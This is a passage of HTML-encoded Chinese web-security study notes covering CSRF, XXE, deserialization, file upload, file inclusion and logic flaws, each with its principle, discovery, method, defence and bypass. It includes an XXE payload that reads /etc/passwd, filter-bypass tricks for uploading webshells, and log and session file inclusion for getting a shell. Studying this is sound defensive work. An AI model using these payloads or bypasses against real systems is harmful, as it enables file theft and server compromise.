&lt;li&gt;通过 Referer 判断：如果在网站中发送的请求，HTTP 头字段 Referer 中的域名就是当前网站。如果是其他网站发起的请求，Referer 就是这个网站域名。服务端可以利用这个 Referer 判断请求是否在网站页面中发起的。此外还可以利用 Origin 头字段，它通常在跨域请求时会携带上。但 Referer 并不完全可靠，在一些老旧的浏览器在实现上可能会有一些问题，有丢失的可能。&lt;/li&gt;
&lt;li&gt;人机校验：加一个短信校验、邮箱校验、谷歌万恶的九宫格什么的，确保是一个人在尝试发这个请求。可以吊打所有攻击，缺点是用户体验不太好。&lt;/li&gt;
&lt;/ol&gt;
&lt;h3 id=&#34;绕过-4&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#绕过-4&#34;&gt;#&lt;/a&gt; 绕过&lt;/h3&gt;
&lt;h4 id=&#34;csrf_token-的位置&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#csrf_token-的位置&#34;&gt;#&lt;/a&gt; CSRF_TOKEN 的位置&lt;/h4&gt;
&lt;p&gt;前端页面中（DOM 或全局变量中）&lt;/p&gt;
&lt;h4 id=&#34;csrf_token-原理&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#csrf_token-原理&#34;&gt;#&lt;/a&gt; CSRF_TOKEN 原理&lt;/h4&gt;
&lt;p&gt;前端请求时就会从 前端页面（DOM 或全局变量）找出这个 csrf_token，作为一个参数带上，让服务端校验。&lt;/p&gt;
&lt;h4 id=&#34;csrf_token-绕过&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#csrf_token-绕过&#34;&gt;#&lt;/a&gt; CSRF_TOKEN 绕过&lt;/h4&gt;
&lt;ol&gt;
&lt;li&gt;更改请求方式&lt;/li&gt;
&lt;li&gt;点击劫持&lt;/li&gt;
&lt;li&gt;使用自己的 token，利用后台漏洞，替换对方的 token 进行验证&lt;/li&gt;
&lt;/ol&gt;
&lt;h2 id=&#34;xxe&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#xxe&#34;&gt;#&lt;/a&gt; XXE&lt;/h2&gt;
&lt;h3 id=&#34;原理-5&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#原理-5&#34;&gt;#&lt;/a&gt; 原理&lt;/h3&gt;
&lt;p&gt;XXE 全称 XML External Entity Injection，也就是 XML 外部实体注入。它是对解析 XML 输入的应用程序的一种攻击。当配置不当的 XML 处理器处理包含对外部实体的引用的 XML 输入时，就会发生此攻击。&lt;br /&gt;
服务端解析用户提交的 XML 文件时，未对 XML 文件引用的外部实体（含外部一般实体和外部参数实体）做合适的处理，并且实体的 URL 支持 file:// 和 ftp:// 等协议，导致可加载恶意外部文件和代码，造成任意文件读取、命令执行、内网端口扫描、攻击内网网站等危害&lt;/p&gt;
&lt;h3 id=&#34;挖掘-4&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#挖掘-4&#34;&gt;#&lt;/a&gt; 挖掘&lt;/h3&gt;
&lt;p&gt;使用 xml 格式提交数据的位置&lt;/p&gt;
&lt;h3 id=&#34;方法-5&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#方法-5&#34;&gt;#&lt;/a&gt; 方法&lt;/h3&gt;
&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;通过 DTD 外部实体声明&lt;br /&gt;
 &lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;?xml version=1.0?&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;!DOCTYPE a  [&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;       &amp;lt;!ENTITY b SYSTEM &amp;quot;file:///etc/passwd&amp;quot;&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;]&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;q&amp;gt;&amp;amp;b;&amp;lt;/q&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;通过 DTD 文档引入外部 DTD 文档，再引入外部实体声明&lt;br /&gt;
 &lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;?xml version=1.0?&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;!DOCTYPE a SYSTEM &amp;quot;http://example/1.dtd&amp;quot;&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;q&amp;gt;&amp;amp;b;&amp;lt;/q&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;h3 id=&#34;防御-4&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#防御-4&#34;&gt;#&lt;/a&gt; 防御&lt;/h3&gt;
&lt;ol&gt;
&lt;li&gt;禁用外部实体&lt;/li&gt;
&lt;li&gt;过滤和验证用户提交的 XML 数据&lt;/li&gt;
&lt;li&gt;使用虚拟补丁程序，API 安全网关或 Web 应用程序防火墙（WAF）来检测和阻止 XXE 攻击&lt;/li&gt;
&lt;li&gt;修补或升级 XML 处理器和库。使用依赖项检查器。&lt;/li&gt;
&lt;/ol&gt;
&lt;h3 id=&#34;绕过-5&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#绕过-5&#34;&gt;#&lt;/a&gt; 绕过&lt;/h3&gt;
&lt;ol&gt;
&lt;li&gt;换协议或利用协议特征&lt;/li&gt;
&lt;li&gt;编码绕过&lt;/li&gt;
&lt;li&gt;外部引用&lt;/li&gt;
&lt;/ol&gt;
&lt;h2 id=&#34;反序列化&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#反序列化&#34;&gt;#&lt;/a&gt; 反序列化&lt;/h2&gt;
&lt;h3 id=&#34;原理-6&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#原理-6&#34;&gt;#&lt;/a&gt; 原理&lt;/h3&gt;
&lt;p&gt;攻击者控制了序列化后的数据，将有害数据传递到应用程序代码中，发动针对应用程序的攻击。&lt;/p&gt;
&lt;h3 id=&#34;挖掘-5&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#挖掘-5&#34;&gt;#&lt;/a&gt; 挖掘&lt;/h3&gt;
&lt;ol&gt;
&lt;li&gt;远程和进程间通信&lt;/li&gt;
&lt;li&gt;连线协议、Web 服务、消息代理&lt;/li&gt;
&lt;li&gt;缓存 / 持久性存储区&lt;/li&gt;
&lt;li&gt;数据库、缓存服务器、文件系统&lt;/li&gt;
&lt;li&gt;HTTP cookie、HTML 表单参数、API 身份验证令牌&lt;/li&gt;
&lt;/ol&gt;
&lt;h3 id=&#34;方法-6&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#方法-6&#34;&gt;#&lt;/a&gt; 方法&lt;/h3&gt;
&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;在 java 和 php 所构造的 class，存在一些特殊成员，会在特定情况下自动调用，而不用程序主动调用。常见的如：&lt;br /&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;__construct ()     创建对象时自动调用 &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;__destruct ()   在销毁对象时自动调用 &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;__call ()	在对象中调用一个不可访问方法时，__call () 会被调用 &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;__callStatic ()	在静态上下文中调用一个不可访问方法时调用 &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;__get ()	读取不可访问属性的值时，__get () 会被调用 &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;__set ()	在给不可访问属性赋值时，__set () 会被调用 &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;__isset ()	当对不可访问属性调用 isset () 或 empty () 时，__isset () 会被调用 &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;__unset ()	当对不可访问属性调用 unset () 时，__unset () 会被调用 &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;__sleep ()	serialize () 函数会检查类中是否存在一个魔术方法__sleep () , 如果存在，该方法会鲜卑调用，然后再执行序列化操作 &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;__wakeup ()	unserialize () 会检查是否存在一个 __wakeup () 方法，如果存在会先调用__wakeup 方法，预先准备对象需要的资源 &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;__toString ()	__toString（） 方法用于一个类被当成字符串时应增氧回应 &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;__invoke ()	当尝试以调用函数的方式调用一个对象时，__invoke () 方法会被自动调用 &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;__set_state ()	字 PHP 5.1.0 起调用 var_export () 导出类时，此静态 方法会被调用 &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;__clone ()	当复制完成时，如果定义了 __clone 方法，则新创建的对象（复制生成的对象）中的 __clone () 方法会被调用，可用于修改属性的值。&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;session 反序列化漏洞&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;phar 反序列化漏洞&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;pop 链构造：指从现有运行环境中寻找一系列的代码或指令调用，然后根据需求构造出一组连续的调用链。&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;h3 id=&#34;防御-5&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#防御-5&#34;&gt;#&lt;/a&gt; 防御&lt;/h3&gt;
&lt;ol&gt;
&lt;li&gt;对反序列数据加密或签名，且加密密钥和签名密钥不要使用硬编码&lt;/li&gt;
&lt;li&gt;对反序列化接口添加认证授权&lt;/li&gt;
&lt;li&gt;设置反序列化服务仅在本地监听或者设置相应防火墙策略&lt;/li&gt;
&lt;li&gt;禁止使用存在漏洞的第三方框架库&lt;/li&gt;
&lt;li&gt;过滤、禁用危险函数&lt;/li&gt;
&lt;li&gt;过滤 T3 协议或限定可连接的 IP&lt;/li&gt;
&lt;li&gt;设置 Nginx 反向代理，实现 t3 协议和 http 协议隔离&lt;/li&gt;
&lt;/ol&gt;
&lt;h3 id=&#34;绕过-6&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#绕过-6&#34;&gt;#&lt;/a&gt; 绕过&lt;/h3&gt;
&lt;ol&gt;
&lt;li&gt;利用加号绕过（注意在 url 里传参时 + 要编码为 %2B）&lt;/li&gt;
&lt;li&gt;利用数组对象绕过，如 serialize (array ($a)); a 为要反序列化的对象 (序列化结果开头是 a，不影响作为数组元素的 $a 的析构)。&lt;/li&gt;
&lt;li&gt;利用引用进行绕过&lt;/li&gt;
&lt;li&gt;16 进制绕过字符的过滤&lt;/li&gt;
&lt;/ol&gt;
&lt;h3 id=&#34;反序列化对象特征&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#反序列化对象特征&#34;&gt;#&lt;/a&gt; 反序列化对象特征&lt;/h3&gt;
&lt;ol&gt;
&lt;li&gt;java 序列化数据特征：序列化文件头，数据 16 进制中以  ac ed 00 05 开头&lt;/li&gt;
&lt;li&gt;tcp：必有 ac ed 00 05，这个 16 进制流基本上也意味者 java 反序列化的开始&lt;/li&gt;
&lt;li&gt;http：必有 rO0AB，其实这就是 aced0005 的 base64 编码的结果&lt;/li&gt;
&lt;/ol&gt;
&lt;h2 id=&#34;文件上传漏洞&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#文件上传漏洞&#34;&gt;#&lt;/a&gt; 文件上传漏洞&lt;/h2&gt;
&lt;h3 id=&#34;原理-7&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#原理-7&#34;&gt;#&lt;/a&gt; 原理&lt;/h3&gt;
&lt;p&gt;文件上传漏洞原理是指在有上传功能的系统中，如果没有对用户上传的文件进行有效的检查过滤，那么恶意用户就可以上传包含脚本的文件，如 Webshell，然后通过访问这些文件的方式，来执行服务端命令，从而控制 Web 网站或者服务器的漏洞&lt;/p&gt;
&lt;h3 id=&#34;挖掘-6&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#挖掘-6&#34;&gt;#&lt;/a&gt; 挖掘&lt;/h3&gt;
&lt;p&gt;查找文件上传功能点常见位置比如文件后台、会员中心，文件扫描（通过扫描工具获取敏感信息）&lt;/p&gt;
&lt;h3 id=&#34;方法-7&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#方法-7&#34;&gt;#&lt;/a&gt; 方法&lt;/h3&gt;
&lt;p&gt;统一写在绕过部分&lt;/p&gt;
&lt;h3 id=&#34;防御-6&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#防御-6&#34;&gt;#&lt;/a&gt; 防御&lt;/h3&gt;
&lt;ol&gt;
&lt;li&gt;文件上传的目录设置为不可执行&lt;/li&gt;
&lt;li&gt;判断文件类型：MIME Type、后缀检查，白名单，黑名单，图片 resize 或压缩&lt;/li&gt;
&lt;li&gt;使用随机数改写文件名和文件路径&lt;/li&gt;
&lt;li&gt;单独设置文件服务器的域名&lt;/li&gt;
&lt;li&gt;使用安全设备防御&lt;/li&gt;
&lt;/ol&gt;
&lt;h3 id=&#34;绕过-7&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#绕过-7&#34;&gt;#&lt;/a&gt; 绕过&lt;/h3&gt;
&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;基于前端 js 的防御：&lt;br /&gt;
a. burp 抓包修改绕过&lt;br /&gt;
 b. 禁用指定 js 文件&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;基于后端的防御：&lt;br /&gt;
a. MEME：抓包修改 content-type&lt;br /&gt;
b. 基于 body 标识头：二进制添加文件标识&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;基于简单过滤：&lt;br /&gt;
a. 双写后缀&lt;br /&gt;
 b. 大小写&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;基于后端黑名单：&lt;br /&gt;
a. fuzz 可上传名单&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;b. htaccess 文件：htaccess 文件是 Apache 服务器中的一个配置文件，全称是 Hypertext Access (超文本入口)。提供了针对目录改变配置的方法，即，在一个特定的文档目录中放置一个包含一个或多个指令的文件，以作用于此目录及其所有子目录。作为用户，所能使用的命令受到限制。管理员可以通过 Apache 的 AllowOverride 指令来设置。攻击者可以上传覆盖.htaccess 文件，重写解析规则，将上传的带有脚本马的图片以脚本方式解析。需要注意的是，htaccess 文件的作用域为其所在目录与其所有的子目录，不过若是子目录也存在.htaccess 文件，则会覆盖父目录的.htaccess 效果。&lt;/p&gt;
&lt;p&gt;c. user.ini 文件：该配置文件同样也是目录的配置文件。.user.ini 使用范围很广，不仅限于 Apache 服务器，同样适用于 Nginx 服务器，只要服务器启用了 fastcgi 模式 (通常非线程安全模式使用的就是 fastcgi 模式)。&lt;br /&gt;
自 PHP 5.3.0 起，.user.ini 是一个能被动态加载的 ini 文件，此类文件仅被 CGI／FastCGI SAPI 处理。不需要重启服务器中间件，只需要等待 user_ini.cache_ttl 所设置的时间（默认为 300 秒），即可被重新加载.&lt;/p&gt;
&lt;p&gt;d. 利用存储型 xss，在上传的正常文件中夹杂恶意代码&lt;/p&gt;
&lt;p&gt;e. soap 协议（简单对象访问协议）：SOAP (Simple Object Access Protocol) 简单对象访问协议是交换数据的一种规范，在 Web Service 中，交换带结构信息。可基于 HTTP 等协议，使用 XML 格式传输，抽象于语言实现、平台和硬件。即多语言包括 PHP、Java、.Net 均可支持。配合 XXE 实现攻击&lt;/p&gt;
&lt;p&gt;f. 根据系统特性绕过：后缀添加空格，添加点，添加冒号，基于特性被删除（windows）；后缀添加 斜杠 ，基于特性被删除（windows/linux）；后缀添加 NTFS 数据流（::$DATA），基于特性（windows）。&lt;/p&gt;
&lt;p&gt;g. 利用容器解析特性：在 Apache1.x，2.  x 中 Apache 解析文件的规则是从右到左开始判断解析，如果后缀名为不可识别文件解析，就再往左判断。因此对于 apache 而言，一个 test.php.qwea 文件依然会将其解析为 php。如果所有的后缀 apache 都不认识，那么就会把该文件当做默认的类型，一般来说默认类型就是 text/plain。在 window 中的认识的后缀都记录在 /apche/conf/mine.types 中，在 Ubuntu 下在 /etc/mime.types；%20%00 空字节代码解析漏洞，例如我们可以请求如下 URI：/test [0x20]/../admin/index.php，这个 URI 不会匹配上 location 后面的 /admin/，也就绕过了其中的 IP 验证；但最后请求的是 /test [0x20]/../admin/index.php 文件，也就是 /admin/index.php，成功访问到后台&lt;/p&gt;
&lt;p&gt;h. 临时文件上传&lt;/p&gt;
&lt;p&gt;i. 条件竞争：我们使用多线程并发的访问上传的文件，总会有一次在上传文件到删除文件这个时间段内访问到上传的 php 文件，一旦我们成功访问到了上传的文件，那么它就会向服务器写一个 shell&lt;/p&gt;
&lt;p&gt;j. 二次渲染：将一句话木马插入到网站二次处理后的图片中，也就是把一句话插入图片在二次渲染后会保留的那部分数据里，确保不会在二次处理时删除掉。这样二次渲染后的图片中就存在了一句话，在配合文件包含漏洞获取 webshell。&lt;/p&gt;
&lt;p&gt;k. 临时文件上传&lt;/p&gt;
&lt;ol start=&#34;5&#34;&gt;
&lt;li&gt;基于后端白名单&lt;br /&gt;
 a. htaccess 文件（在 httpd.conf 文件中配置 mod_rewrite 模块开启，同时需要将 AllowOverride None 改为 AllowOverride All）&lt;br /&gt;
b. html 文件（存储型 xss）&lt;br /&gt;
c. 利用文件包含漏洞：包含解析存在 webshell 的文件；tomcat ajp 协议任务文件包含；thinkphp 任意文件包含日志 getshell&lt;br /&gt;
d. 容器解析特征：IIS 目录解析，5.X/6.0 版本，目录名包含.asp、.asa、.cer、.cdx、目录下文件都按照 asp 解析执行（/text.asp/1.jpg）；IIS 文件名解析，5.X/6.0 版本，文件名包含.asp;、.asa;、.cer;、.cdx;、优先按照 asp 解析执行（/1.aps;1.jpg）&lt;br /&gt;
e. 配置不当：PHP CGI 解析漏洞，php.ini 配置文件 cgi.fix_pathinfo=1，则在（/1.jpg/1.php）和（/1.jpg/.php）中，1.jpg 以 php 来解析&lt;br /&gt;
 f. 编辑器漏洞：UEditor 任意文件上传；FCKeditor 编辑器；EWEbeditor 编辑器；DotNetTextBox 编辑器；Kedit 编辑器；Cute Editor 在线编辑器&lt;/li&gt;
&lt;/ol&gt;
&lt;h2 id=&#34;文件包含漏洞&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#文件包含漏洞&#34;&gt;#&lt;/a&gt; 文件包含漏洞&lt;/h2&gt;
&lt;h3 id=&#34;原理-8&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#原理-8&#34;&gt;#&lt;/a&gt; 原理&lt;/h3&gt;
&lt;p&gt;在通过 PHP 的相应函数引入文件时，由于传入的文件名没有经过合理的校验，从而操作了预想之外的文件，就可能导致意外的文件泄露甚至恶意的代码注入，这通常需要包括两个条件： include () 等函数通过动态变量的方式引入需要包含的文件；用户能够控制这个动态变量。&lt;/p&gt;
&lt;p&gt;常见函数包括：&lt;br /&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Include：包含并运行指定文件，当包含外部文件发生错误时，系统给出警告，但整个 php 文件继续执行。&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Require：跟 include 唯一不同的是，当产生错误时候，include 会继续运行而 require 停止运行。&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Include_once：这个函数跟 include 函数作用几乎相同，只是他在导入函数之前先检测下该文件是否被导入。如果已经执行一遍那么就不重复执行了。&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Require_once：这个函数跟 require 函数作用几乎相同，与 include_once 和 include 类似。&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;php.ini 配置文件：allow_url_fopen=off 即不可以包含远程文件。php4 存在远程包含 &amp; amp; 本地包含，php5 仅存在本地包含。&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;h3 id=&#34;挖掘-7&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#挖掘-7&#34;&gt;#&lt;/a&gt; 挖掘&lt;/h3&gt;
&lt;ol&gt;
&lt;li&gt;白盒审计&lt;/li&gt;
&lt;li&gt;url 中存在使用 php 文件作为参数（例如 &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovL2V4YW1wbGUuY29tP3VybD1pbmRleC5waHAlRUYlQkMlODk=&#34;&gt;http://example.com?url=index.php）&lt;/span&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;h3 id=&#34;方法-8&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#方法-8&#34;&gt;#&lt;/a&gt; 方法&lt;/h3&gt;
&lt;ol&gt;
&lt;li&gt;包含日志文件:/var/log/apache2/access.log, /var/log/nginx/access.log&lt;/li&gt;
&lt;li&gt;包含图片木马&lt;/li&gt;
&lt;li&gt;包含 session 文件&lt;/li&gt;
&lt;li&gt;file 协议&lt;/li&gt;
&lt;li&gt;如果是 php 后端，可能存在 php 伪协议&lt;/li&gt;
&lt;/ol&gt;
&lt;h3 id=&#34;防御-7&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#防御-7&#34;&gt;#&lt;/a&gt; 防御&lt;/h3&gt;
&lt;ol&gt;
&lt;li&gt;设置白名单&lt;/li&gt;
&lt;li&gt;过滤危险字符&lt;/li&gt;
&lt;li&gt;设置文件目录&lt;/li&gt;
&lt;li&gt;关闭危险设置&lt;/li&gt;
&lt;/ol&gt;
&lt;h3 id=&#34;绕过-8&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#绕过-8&#34;&gt;#&lt;/a&gt; 绕过&lt;/h3&gt;
&lt;p&gt;都挺基础的，就不重复了，参考前面的绕过方法&lt;/p&gt;
&lt;h2 id=&#34;逻辑漏洞&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#逻辑漏洞&#34;&gt;#&lt;/a&gt; 逻辑漏洞&lt;/h2&gt;
&lt;h3 id=&#34;任意用户密码重置&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#任意用户密码重置&#34;&gt;#&lt;/a&gt; 任意用户密码重置&lt;/h3&gt;
&lt;p&gt;未经用户本身授权，在未知他人的重置密码链接或手机验证码的情况下，通过构造重置密码链接或穷举验证码等方法直接重置他人密码的一种攻击方式。任意用户密码重置影响系统的稳定性，可由此作为攻击入口，进行持续攻击。&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;验证码无时间限制&lt;/li&gt;
&lt;li&gt;验证码在 Response 包中回显&lt;/li&gt;
&lt;li&gt;验证码为固定值&lt;/li&gt;
&lt;li&gt;密码重置步骤未进行校验&lt;/li&gt;
&lt;li&gt;未验证 cookie 信息&lt;/li&gt;
&lt;li&gt;用户名，手机 / 邮箱号，验证码三者未进行匹配性验证&lt;/li&gt;
&lt;li&gt;在本地客户端进行验证码校验&lt;/li&gt;
&lt;li&gt;修改密码处 id 值可替换&lt;/li&gt;
&lt;li&gt;修改信息时替换，添加字段值&lt;/li&gt;
&lt;li&gt;验证码与手机 / 邮箱号未进行匹配性验证&lt;/li&gt;
&lt;/ol&gt;
&lt;h3 id=&#34;短信轰炸&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#短信轰炸&#34;&gt;#&lt;/a&gt; 短信轰炸&lt;/h3&gt;
&lt;p&gt;一般就是接口没有做好时间限制或者访问限制。&lt;/p&gt;
&lt;h3 id=&#34;支付漏洞&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#支付漏洞&#34;&gt;#&lt;/a&gt; 支付漏洞&lt;/h3&gt;
&lt;p&gt;过于信任线段传入的数据，导致出现支付漏洞&lt;/p&gt;
&lt;h3 id=&#34;忘记密码绕过&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#忘记密码绕过&#34;&gt;#&lt;/a&gt; 忘记密码绕过&lt;/h3&gt;
&lt;h3 id=&#34;验证码复用&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#验证码复用&#34;&gt;#&lt;/a&gt; 验证码复用&lt;/h3&gt;
&lt;p&gt;后端不删验证码是吧&lt;/p&gt;
&lt;h3 id=&#34;越权&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#越权&#34;&gt;#&lt;/a&gt; 越权&lt;/h3&gt;
&lt;h4 id=&#34;水平越权&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#水平越权&#34;&gt;#&lt;/a&gt; 水平越权&lt;/h4&gt;
&lt;p&gt;水平越权指的是攻击者尝试访问与他拥有相同权限的用户的资源，怎么理解呢？比如某系统中有个人资料这个功能，A 账号和 B 账号都可以访问这个功能，但是 A 账号的个人信息和 B 账号的个人信息不同，可以理解为 A 账号和 B 账号个人资料这个功能上具备水平权限的划分。此时， A 账号通过攻击手段访问了 B 账号的个人资料，这就是水平越权漏洞。&lt;br /&gt;
常见场景：1. 基于用户身份 id；2. 基于对象 id；3. 基于文件名&lt;/p&gt;
&lt;h4 id=&#34;垂直越权&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#垂直越权&#34;&gt;#&lt;/a&gt; 垂直越权&lt;/h4&gt;
